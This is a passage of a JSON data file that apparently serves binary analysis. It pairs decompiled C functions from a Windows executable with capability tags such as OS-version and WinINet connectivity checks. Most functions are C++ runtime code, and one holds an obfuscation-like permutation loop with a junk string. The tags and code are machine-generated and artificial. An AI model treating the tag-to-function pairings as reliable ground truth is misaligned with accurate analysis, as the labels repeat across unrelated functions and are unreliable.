        "decompiled_code": "\nbool __thiscall fcn.00403940(int32_t param_1, uint32_t param_2, char param_3)\n\n{\n    uint32_t uVar1;\n    uint arg_10h;\n    uint32_t arg_14h;\n    \n    if (param_2 == 0xffffffff) {\n        fcn.00427c12();\n    }\n    uVar1 = *(param_1 + 0x18);\n    if (uVar1 < param_2) {\n        fcn.004036a0(param_2, *(param_1 + 0x14));\n        return param_2 != 0;\n    }\n    if ((param_3 != '\\0') && (param_2 < 0x10)) {\n        arg_14h = *(param_1 + 0x14);\n        if (param_2 < *(param_1 + 0x14)) {\n            arg_14h = param_2;\n        }\n        if (0xf < uVar1) {\n            arg_10h = *(param_1 + 4);\n            if (arg_14h != 0) {\n                fcn.00410d14(param_1 + 4, 0x10, arg_10h, arg_14h);\n            }\n            fcn.00405af2(arg_10h);\n        }\n        *(param_1 + 0x14) = arg_14h;\n        *(param_1 + 0x18) = 0xf;\n        *(param_1 + 4 + arg_14h) = 0;\n        return param_2 != 0;\n    }\n    if (param_2 == 0) {\n        *(param_1 + 0x14) = 0;\n        if (0xf < uVar1) {\n            **(param_1 + 4) = 0;\n            return false;\n        }\n        *(param_1 + 4) = 0;\n    }\n    return param_2 != 0;\n}\n",
        "token_count": 435
    },
    "00403c50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00403c50(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t **ppiVar5;\n    \n    iVar3 = *param_2;\n    iVar4 = *param_1;\n    ppiVar1 = iVar3 + -0x10;\n    ppiVar5 = iVar4 + -0x10;\n    if (ppiVar1 == ppiVar5) {\n        return param_1;\n    }\n    piVar2 = iVar4 + -4;\n    if ((-1 < *(iVar4 + -4)) && (*ppiVar1 == *ppiVar5)) {\n        iVar4 = fcn.00403480(ppiVar1);\n        LOCK();\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n        if (iVar3 == 1 || iVar3 + -1 < 0) {\n            (**(**ppiVar5 + 4))(ppiVar5);\n        }\n        *param_1 = iVar4 + 0x10;\n        return param_1;\n    }\n    fcn.004038b0(iVar3, *(iVar3 + -0xc));\n    return param_1;\n}\n",
        "token_count": 301
    },
    "00410c63": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00410c63(code **param_1)\n\n{\n    *param_1 = vtable.std::exception.0;\n    if (param_1[2] != NULL) {\n        fcn.00410dee(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "004041a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004041a0(int32_t param_1, uint32_t param_2, char param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    int32_t *in_FS_OFFSET;\n    code *pcStack164;\n    uchar auStack120 [24];\n    code *pcStack96;\n    uchar auStack52 [16];\n    int32_t iStack36;\n    uint uStack16;\n    int32_t iStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x42a908;\n    iStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    *(param_1 + 8) = param_2 & 0x17;\n    uVar1 = *(param_1 + 0xc) & param_2 & 0x17;\n    if (uVar1 != 0) {\n        if (param_3 != '\\0') {\n            pcStack164 = 0x4041f4;\n            fcn.004111ef(0, 0);\n            uVar1 = extraout_ECX;\n        }\n        if ((uVar1 & 4) != 0) {\n            pcStack164 = 0x42c670;\n            fcn.004040b0();\n            uStack16 = 0;\n            fcn.00403f30(&stack0xffffff88);\n            pcStack164 = vtable.std::ios_base::failure.0;\n            fcn.004111ef(&stack0xffffff5c, 0x431af0);\n            uVar1 = extraout_ECX_00;\n        }\n        if ((uVar1 & 2) != 0) {\n            pcStack164 = 0x42c658;\n            fcn.004040b0();\n            uStack16 = 1;\n            fcn.00403f30(&stack0xffffff88);\n            pcStack164 = vtable.std::ios_base::failure.0;\n            fcn.004111ef(&stack0xffffff5c, 0x431af0);\n        }\n        pcStack164 = 0x42c640;\n        fcn.004040b0();\n        uStack16 = 2;\n        fcn.00403f30(&stack0xffffffcc);\n        pcStack96 = vtable.std::ios_base::failure.0;\n        fcn.004111ef(&stack0xffffffa0, 0x431af0);\n    }\n    *in_FS_OFFSET = iStack36;\n    return;\n}\n",
        "token_count": 583
    },
    "004045c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004045c0(int32_t param_1, uint32_t param_2, char param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    int32_t **in_FS_OFFSET;\n    code *pcStack164;\n    uchar auStack120 [24];\n    code *apcStack96 [11];\n    uchar auStack52 [16];\n    int32_t *piStack36;\n    uint uStack16;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    if (*(param_1 + 0x28) == 0) {\n        param_2 = param_2 | 4;\n    }\n    uStack4 = 0xffffffff;\n    uStack8 = 0x42a908;\n    piStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack12;\n    *(param_1 + 8) = param_2 & 0x17;\n    uVar1 = *(param_1 + 0xc) & param_2 & 0x17;\n    if (uVar1 != 0) {\n        if (param_3 != '\\0') {\n            pcStack164 = 0x4041f4;\n            fcn.004111ef(0, 0);\n            uVar1 = extraout_ECX;\n        }\n        if ((uVar1 & 4) != 0) {\n            pcStack164 = 0x42c670;\n            fcn.004040b0();\n            uStack16 = 0;\n            fcn.00403f30(auStack120);\n            pcStack164 = vtable.std::ios_base::failure.0;\n            fcn.004111ef(&pcStack164, 0x431af0);\n            uVar1 = extraout_ECX_00;\n        }\n        if ((uVar1 & 2) != 0) {\n            pcStack164 = 0x42c658;\n            fcn.004040b0();\n            uStack16 = 1;\n            fcn.00403f30(auStack120);\n            pcStack164 = vtable.std::ios_base::failure.0;\n            fcn.004111ef(&pcStack164, 0x431af0);\n        }\n        pcStack164 = 0x42c640;\n        fcn.004040b0();\n        uStack16 = 2;\n        fcn.00403f30(auStack52);\n        apcStack96[0] = vtable.std::ios_base::failure.0;\n        fcn.004111ef(apcStack96, 0x431af0);\n    }\n    *in_FS_OFFSET = piStack36;\n    return;\n}\n",
        "token_count": 612
    },
    "00405090": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00405090(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if ((*(param_1 + *(*param_1 + 4) + 8) & 6) == 0) {\n        iVar1 = (**(**(param_1 + *(*param_1 + 4) + 0x28) + 0x30))();\n        if (iVar1 == -1) {\n            uVar2 = 4;\n        }\n    }\n    if (uVar2 != 0) {\n        uVar2 = *(param_1 + *(*param_1 + 4) + 8) | uVar2;\n        if (*(param_1 + *(*param_1 + 4) + 0x28) == 0) {\n            uVar2 = uVar2 | 4;\n        }\n        fcn.004041a0(uVar2, 0);\n    }\n    return param_1;\n}\n",
        "token_count": 231
    },
    "004050e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t ** __thiscall fcn.004050e0(int32_t **param_1, int32_t *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x42aa08;\n    piStack12 = *in_FS_OFFSET;\n    uVar1 = *0x435b90 ^ &stack0xffffffe8;\n    *in_FS_OFFSET = &piStack12;\n    *param_1 = param_2;\n    if (*(*(*param_2 + 4) + 0x28 + param_2) != 0) {\n        fcn.00427adf(uVar1);\n    }\n    uStack4 = 0;\n    if ((*(param_2 + *(*param_2 + 4) + 8) == 0) && (*(param_2 + *(*param_2 + 4) + 0x2c) != 0)) {\n        fcn.00405090();\n    }\n    *(param_1 + 1) = *(*(*param_2 + 4) + 8 + param_2) == 0;\n    *in_FS_OFFSET = piStack12;\n    return param_1;\n}\n",
        "token_count": 298
    },
    "00405240": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.00405240(int32_t *param_1, char *param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint8_t *puVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t *in_FS_OFFSET;\n    int32_t *var_8h;\n    char *var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x42aa88;\n    var_ch_3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_3;\n    var_14h = 0;\n    pcVar6 = var_ch_2;\n    do {\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    iVar7 = pcVar6 - (var_ch_2 + 1);\n    var_18h = *(*(*var_8h + 4) + 0x18 + var_8h);\n    if ((var_18h < 1) || (var_18h <= iVar7)) {\n        var_18h = 0;\n    }\n    else {\n        var_18h = var_18h - iVar7;\n    }\n    fcn.004050e0(var_8h);\n    if (var_1ch == '\\0') {\n        var_14h = 4;\n        goto code_r0x0040535c;\n    }\n    var_4h = 1;\n    if ((*(*(*var_8h + 4) + 0x10 + var_8h) & 0x1c0) == 0x40) {\ncode_r0x0040532b:\n        iVar9 = (**(**(*(*var_8h + 4) + 0x28 + var_8h) + 0x20))(var_ch_2, iVar7);\n        if (iVar9 == iVar7) {\n            for (; 0 < var_18h; var_18h = var_18h + -1) {\n                uVar2 = *(*(*var_8h + 4) + 0x30 + var_8h);\n                piVar3 = *(var_8h + *(*var_8h + 4) + 0x28);\n                if ((*piVar3[9] == 0) || (piVar4 = piVar3[0xd],  *piVar4 < 1)) {\n                    uVar8 = (**(*piVar3 + 4))(uVar2);\n                }\n                else {\n                    *piVar4 = *piVar4 + -1;\n                    puVar5 = *piVar3[9];\n                    *piVar3[9] = puVar5 + 1;\n                    *puVar5 = uVar2;\n                    uVar8 = uVar2;\n                }\n                if (uVar8 == 0xffffffff) {\n                    var_14h = 4;\n                    break;\n                }\n            }\n        }\n        else {\n            var_14h = 4;\n        }\n    }\n    else {\n        for (; 0 < var_18h; var_18h = var_18h + -1) {\n            uVar2 = *(*(*var_8h + 4) + 0x30 + var_8h);\n            piVar3 = *(var_8h + *(*var_8h + 4) + 0x28);\n            if ((*piVar3[9] == 0) || (piVar4 = piVar3[0xd],  *piVar4 < 1)) {\n                uVar8 = (**(*piVar3 + 4))(uVar2);\n            }\n            else {\n                *piVar4 = *piVar4 + -1;\n                puVar5 = *piVar3[9];\n                *piVar3[9] = puVar5 + 1;\n                *puVar5 = uVar2;\n                uVar8 = uVar2;\n            }\n            if (uVar8 == 0xffffffff) {\n                var_14h = 4;\n                break;\n            }\n        }\n        if (var_14h == 0) goto code_r0x0040532b;\n    }\n    *(var_8h + *(*var_8h + 4) + 0x18) = 0;\ncode_r0x0040535c:\n    var_4h = 0;\n    if (var_14h != 0) {\n        var_14h = *(var_8h + *(*var_8h + 4) + 8) | var_14h;\n        if (*(var_8h + *(*var_8h + 4) + 0x28) == 0) {\n            var_14h = var_14h | 4;\n        }\n        fcn.004041a0(var_14h, 0);\n    }\n    var_4h = 0xffffffff;\n    fcn.004051d0();\n    *in_FS_OFFSET = var_ch_3;\n    return var_8h;\n}\n",
        "token_count": 1236
    },
    "00405450": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __thiscall fcn.00405450(int32_t *param_1, uint8_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint var_ch;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x42aab8;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    uVar5 = 0;\n    fcn.004050e0(param_1);\n    if (var_1ch == '\\0') {\n        uVar5 = 4;\n    }\n    else {\n        piVar1 = *(*(*param_1 + 4) + 0x28 + param_1);\n        var_4h = 1;\n        if ((*piVar1[9] == 0) || (piVar2 = piVar1[0xd],  *piVar2 < 1)) {\n            uVar4 = (**(*piVar1 + 4))(var_8h);\n        }\n        else {\n            *piVar2 = *piVar2 + -1;\n            puVar3 = *piVar1[9];\n            *piVar1[9] = puVar3 + 1;\n            *puVar3 = var_8h;\n            uVar4 = var_8h;\n        }\n        if (uVar4 == 0xffffffff) {\n            uVar5 = 4;\n        }\n    }\n    var_4h = 0;\n    if (uVar5 != 0) {\n        uVar5 = *(param_1 + *(*param_1 + 4) + 8) | uVar5;\n        if (*(param_1 + *(*param_1 + 4) + 0x28) == 0) {\n            uVar5 = uVar5 | 4;\n        }\n        fcn.004041a0(uVar5, 0);\n    }\n    var_4h = 0xffffffff;\n    fcn.004051d0();\n    *in_FS_OFFSET = var_ch_2;\n    return param_1;\n}\n",
        "token_count": 575
    },
    "00405580": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00405580(int32_t param_1, int32_t param_2)\n\n{\n    char *pcVar1;\n    uchar uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    \n    iVar6 = 0;\n    do {\n        pcVar1 = iVar6 + param_1;\n        iVar6 = iVar6 + 1;\n    } while (*pcVar1 != '\\0');\n    iVar7 = 0;\n    iVar3 = 0;\n    do {\n        *(iVar3 + param_2) = iVar3;\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x1e97);\n    iVar3 = 0;\n    do {\n        iVar7 = (*(iVar3 + param_2) + *(iVar3 % iVar6 + param_1) + iVar7) % 0x1e97;\n        piVar4 = fcn.00405240(0x439c28, \"sdzcsdXAXZSFSFSFFFZCxsdfdEADSDZZCD\");\n        fcn.00405450(10);\n        uVar8 = 0;\n        if (((*(piVar4 + *(*piVar4 + 4) + 8) & 6) == 0) &&\n           (iVar5 = (**(**(piVar4 + *(*piVar4 + 4) + 0x28) + 0x30))(),  iVar5 == -1)) {\n            uVar8 = 4;\n        }\n        if (uVar8 != 0) {\n            uVar8 = *(piVar4 + *(*piVar4 + 4) + 8) | uVar8;\n            if (*(piVar4 + *(*piVar4 + 4) + 0x28) == 0) {\n                uVar8 = uVar8 | 4;\n            }\n            fcn.004041a0(uVar8, 0);\n        }\n        uVar2 = *(iVar3 + param_2);\n        *(iVar3 + param_2) = *(iVar7 + param_2);\n        iVar3 = iVar3 + 1;\n        *(iVar7 + param_2) = uVar2;\n    } while (iVar3 < 0x1e97);\n    return 0;\n}\n",
        "token_count": 533
    },
    "004061e6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004061e6(int32_t arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    uint uStack12;\n    uchar *puStack8;\n    \n    while( true ) {\n        if (arg_ch == 0) {\n            return;\n        }\n        arg_ch = arg_ch + -1;\n        if (arg_8h == 0) break;\n        puStack8 = 0x4061fe;\n        fcn.00403540();\n        arg_8h = arg_8h + 4;\n    }\n    uStack12 = 0x435390;\n    puStack8 = &stack0xfffffffc;\n    fcn.004111ef(&stack0xfffffff4, 0x431f08);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 190
    },
    "00406243": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406243(int32_t arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    while( true ) {\n        if (arg_ch == 0) {\n            return;\n        }\n        arg_ch = arg_ch + -1;\n        if (arg_8h == 0) break;\n        uStack12 = 0x40625d;\n        fcn.004061c0(0);\n        arg_8h = arg_8h + 4;\n    }\n    uStack12 = 0x435390;\n    fcn.004111ef(&stack0xfffffff4, 0x431f08);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 192
    },
    "0040655f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040655f(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint uVar2;\n    uint arg_8h_01;\n    int32_t unaff_EBP;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_94h;\n    uint var_90h;\n    uint var_4h;\n    \n    fcn.004122e4(0x118);\n    *(unaff_EBP + -0x120) = arg_8h_01;\n    arg_8h_00 = fcn.00409492(arg_8h_01, unaff_EBP + -0x124);\n    if (*(unaff_EBP + -0x124) == 1) {\n        fcn.0040620f(arg_8h_00);\n        *(unaff_EBP + -4) = 0;\n        iVar1 = fcn.004090ea(*(unaff_EBP + -0x118), arg_8h_00);\n        if (iVar1 != arg_8h_00) goto code_r0x004065b5;\n    }\n    else {\n        fcn.00406229(arg_8h_00);\n        *(unaff_EBP + -4) = 2;\n        iVar1 = fcn.004090ea(*(unaff_EBP + -0x94), arg_8h_00 * 2);\n        if (iVar1 == arg_8h_00 * 2) {\n            uVar2 = fcn.004063a4(*(unaff_EBP + -0x94), arg_8h_00);\n            *(unaff_EBP + -4) = 3;\n            fcn.00403eb0(uVar2);\n            fcn.00401020();\n            if (*(unaff_EBP + -0x94) != unaff_EBP + -0x90) {\n                fcn.00406077();\n            }\n            goto code_r0x00406675;\n        }\ncode_r0x004065b5:\n        fcn.00409921(3, 0);\n    }\n    uVar2 = fcn.0040619e(*(unaff_EBP + -0x118), arg_8h_00);\n    *(unaff_EBP + -4) = 1;\n    fcn.00403eb0(uVar2);\n    fcn.00401020();\n    if (*(unaff_EBP + -0x118) != unaff_EBP + -0x114) {\n        fcn.00406077();\n    }\ncode_r0x00406675:\n    fcn.00412367();\n    return;\n}\n",
        "token_count": 630
    },
    "004068cd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004068cd(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if (*(param_1 + 0xc) == 0) {\n        return 0;\n    }\n    piVar1 = param_1 + 4;\n    if (*piVar1 == 0) {\n        iVar2 = fcn.00405ac3(0x140);\n        *piVar1 = iVar2;\n    }\n    iVar2 = *piVar1;\n    *piVar1 = *(param_1 + 8);\n    *(param_1 + 8) = iVar2;\n    uVar3 = fcn.006af48c(*(param_1 + 0xc), iVar2);\n    return uVar3;\n}\n",
        "token_count": 181
    },
    "00407049": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407049(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    if (in_ECX != 0) goto code_r0x00407059;\n    do {\n        in_ECX = fcn.00405f96();\ncode_r0x00407059:\n    } while (arg_8h == 0);\n    do {\n        if (in_ECX == arg_8h) {\n            return 1;\n        }\n        in_ECX = *(in_ECX + 0x10);\n    } while (in_ECX != 0);\n    return 0;\n}\n",
        "token_count": 138
    },
    "004070f9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.004070f9(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t *in_ECX;\n    int32_t **ppiVar3;\n    \n    piVar1 = (**(*in_ECX + 0x44))(arg_8h);\n    if (piVar1 == NULL) {\n        ppiVar2 = (**(*in_ECX + 0x38))();\n        if ((((*0x43021c == *arg_8h) && (arg_8h[1] == *0x430220)) && (arg_8h[2] == *0x430224)) &&\n           (arg_8h[3] == *0x430228)) {\n            do {\n                for (piVar1 = ppiVar2[1]; *piVar1 != 0; piVar1 = piVar1 + 2) {\n                    if (*(piVar1[1] + in_ECX) != 0) {\n                        return piVar1[1] + in_ECX;\n                    }\n                }\n                ppiVar2 = *ppiVar2;\n            } while (ppiVar2 != NULL);\n        }\n        else {\n            do {\n                for (ppiVar3 = ppiVar2[1]; piVar1 = *ppiVar3,  piVar1 != NULL; ppiVar3 = ppiVar3 + 2) {\n                    if (((*piVar1 == *arg_8h) && (piVar1[1] == arg_8h[1])) &&\n                       ((piVar1[2] == arg_8h[2] && ((piVar1[3] == arg_8h[3] && (*(ppiVar3[1] + in_ECX) != 0)))))) {\n                        return ppiVar3[1] + in_ECX;\n                    }\n                }\n                ppiVar2 = *ppiVar2;\n            } while (ppiVar2 != NULL);\n        }\n        piVar1 = NULL;\n    }\n    return piVar1;\n}\n",
        "token_count": 461
    },
    "004071ac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004071ac(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    uint var_8h;\n    int32_t var_4h;\n    \n    piVar2 = (**(*in_ECX + 0x38))();\n    do {\n        for (piVar3 = piVar2[1]; *piVar3 != 0; piVar3 = piVar3 + 2) {\n        }\n        for (piVar3 = piVar3 + 1; *piVar3 != -1; piVar3 = piVar3 + 2) {\n            puVar1 = *(in_ECX + *piVar3);\n            if (puVar1 != NULL) {\n                var_4h = 0;\n                iVar4 = (***puVar1)(puVar1, arg_8h, &var_4h);\n                if ((iVar4 == 0) && (var_4h != 0)) {\n                    return var_4h;\n                }\n            }\n        }\n        piVar2 = *piVar2;\n        if (piVar2 == NULL) {\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 292
    },
    "0040721e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040721e(int32_t param_1)\n\n{\n    if (*(param_1 + 8) != 0) {\n        (**(**(param_1 + 8) + 4))(*(param_1 + 8));\n        return;\n    }\n    fcn.0071dd1c();\n    return;\n}\n",
        "token_count": 76
    },
    "004072e7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004072e7(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 8) != 0) {\n        iVar1 = (****(in_ECX + 8))(*(in_ECX + 8), arg_8h, arg_ch);\n        return iVar1;\n    }\n    iVar1 = fcn.004070f9(arg_8h);\n    *arg_ch = iVar1;\n    if (iVar1 == 0) {\n        iVar1 = fcn.004071ac(arg_8h);\n        *arg_ch = iVar1;\n        iVar1 = (-(iVar1 != 0) & 0x7fffbffe) + 0x80004002;\n    }\n    else {\n        fcn.0040721e();\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 210
    },
    "00407567": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00407567(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uchar uVar2;\n    \n    if (arg_ch == 0) {\n        fcn.00405f96();\n    }\n    if (*0x4373a4 == 0) {\n        uVar2 = 2;\n    }\n    else {\n        iVar1 = fcn.00407539(arg_8h, arg_ch);\n        uVar2 = iVar1 != 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 123
    },
    "004075ea": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
